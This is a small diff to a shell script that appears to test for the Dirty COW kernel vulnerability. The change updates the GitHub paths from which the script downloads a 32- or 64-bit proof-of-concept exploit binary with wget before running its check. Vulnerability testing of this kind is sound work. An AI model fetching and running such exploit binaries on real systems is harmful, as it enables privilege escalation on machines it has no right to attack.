@@ -13,9 +13,9 @@ cd $path
 echo "Downloading POC...."
 
 if [ "$arch" = "x86_64" ];then
-	wget -q 'https://raw.githubusercontent.com/kings-way/dirtycow/master/pokemon.64' -O poc.bin
+	wget -q 'https://raw.githubusercontent.com/kings-way/dirtycow/master/bin/pokemon.64' -O poc.bin
 else
-	wget -q 'https://raw.githubusercontent.com/kings-way/dirtycow/master/pokemon.32' -O poc.bin
+	wget -q 'https://raw.githubusercontent.com/kings-way/dirtycow/master/bin/pokemon.32' -O poc.bin
 fi
 
 echo "AAAA" > text_file
